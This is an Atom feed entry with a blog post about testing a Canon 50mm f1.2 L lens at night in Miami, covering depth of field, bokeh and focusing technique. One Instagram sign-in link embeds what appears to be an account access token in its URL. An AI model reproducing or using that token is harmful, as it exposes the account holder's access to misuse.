    <content type="html"><![CDATA[<p><a href='http://www.dan-vidal.com//blog/2012/09/27//' data-instagram-url='http://instagr.am/p/QEfxiVggDY/' class='instagram-image'><img src='http://distilleryimage0.s3.amazonaws.com/4c65b4c0087411e2bfbf22000a1e9be6_7.jpg' alt='Testing 50 1.2 L - insane. #bokeh #w210 #305 #brickell #designdistrict' height='612' width='612' /></a><br/>Filtered with <a href='http://www.dan-vidal.com//blog/categories/normal'>Normal</a> through <a href='http://www.dan-vidal.com//blog/categories/instagram'>Instagram</a></p>


<!--more-->


<p><a href='http://maps.google.com?q=25.835181305,-80.182557106'><img border='0' src='http://maps.googleapis.com/maps/api/staticmap?center=25.835181305,-80.182557106&markers=25.835181305,-80.182557106&zoom=14&size=612x200&sensor=false' alt='Talk Nightlife' /></a><br/>Taken at Talk Nightlife</p>


<p class='instagram-comment-holder'><a href='https://instagram.com/oauth/authorize/?client_id=082223ce4af44db2a4b0440fd98957c9&redirect_uri=http://www.dan-vidal.com/#access_token=31120127.082223c.33c03a5584f54c3494027e191a8d7b73&response_type=token&scope=likes+comments' id='289496019622822104_31120127' class='instagram-comment-link'>Sign in with Instagram to view Likes and Comments</a></p>


<p>I took a little drive around last night to further test and experiment with my new Canon 50 1.2 L.</p>

<p>This time, it was more to test the shallow depth-of-field characteristics at <em>f1.2</em>. Again, at that aperture, your zone of acceptable focus is quite shallow.</p>

<p><img class="center" src="https://s3.amazonaws.com/dvblog/dof-7868.jpg" width="960" height="640" title="'E320 W210 50 1.2 L'" ></p>

<p>As you can see here, the hood ornament on my W210 is only partially in focus. The central part of the left spoke is sharp, with the left circular part of the ornament fading into a rather pleasant blur. And the distant background exhibits the smooth bokeh this lens is known for.</p>

<p>Now, this was shot handheld with autofocus engaged. So, this shot is technically a little &#8220;off&#8221;.</p>

<p>At such shallow depths-of-field, every movement counts. If you drift forwards or backwards even slightly, your zone of acceptable focus will change noticeably.</p>

<p>However, this is only noticeable to a great extent when one is doing closeup macro-style shots of objects. The tolerance is a little different at a longer range, as you can see here with this image I took of a <a href="http://miami.car2go.com/">Car2Go Miami</a> Smart Fortwo in Brickell.</p>

<p><img class="center" src="https://s3.amazonaws.com/dvblog/dof-7865.jpg" width="960" height="640" title="'Car2Go Miami 50 1.2 L'" ></p>

<p>Images like these, at a standoff range, can be done handheld, since the further away you are from your object, the less shallow your zone of critical focus becomes. You can do it handheld, that&#8217;s for sure. That being said, sometimes it&#8217;s not always practical to use a tripod. So, the best you can do in these situations is focus manually, and stay very still. Sounds simplistic, but in the case of street photography, you can&#8217;t really overproduce a shot, in my mind.</p>

<p><img class="center" src="https://s3.amazonaws.com/dvblog/dof-7879.jpg" width="960" height="640" title="'Street Graffiti Design District Miami 50 1.2 L'" ></p>

<p>The advantage of digital, of course, is that you can take as many images as you need, to get the desired image. This photo below, I initially did with autofocus. Of course, the results were a little off. However, when I manually focused, crouched down, and took three shots in succession, I landed the one I wanted. Not &#8220;spray-and-pray&#8221; but a small three-frame burst to insure I got what I wanted. Of course the ultimate insurance would have been using my tripod, but at 3 AM in Miami&#8217;s Design District, breaking out equipment at a grand scale isn&#8217;t advisable.</p>

<p><img class="center" src="https://s3.amazonaws.com/dvblog/dof_rev-7894.jpg" width="960" height="640" title="'W210 Design District Miami 50 1.2 L'" ></p>

<p>Not out of any sense of danger really, but more out of a sense of &#8220;It&#8217;s 3 in the morning and I don&#8217;t want to rig up a tripod for a test photo&#8230;&#8221;</p>

<p>So, in a nutshell, if you are going to shoot with this at it&#8217;s most shallow depth-of-field, I definitely recommend using a tripod, as well as focusing manually, if you are shooting your subject at close range. If you stand off a bit, it becomes less of a problem of course since your zone of acceptable focus becomes correspondingly wider.</p>

<p>But, with these characteristics in mind, the 50 1.2 L is definitely a worthwhile addition to any photographic arsenal. Everyone needs a solid 50mm prime lens, and this is the most solid one in it&#8217;s class on the market.</p>
]]></content>
  </entry>
  
</feed>
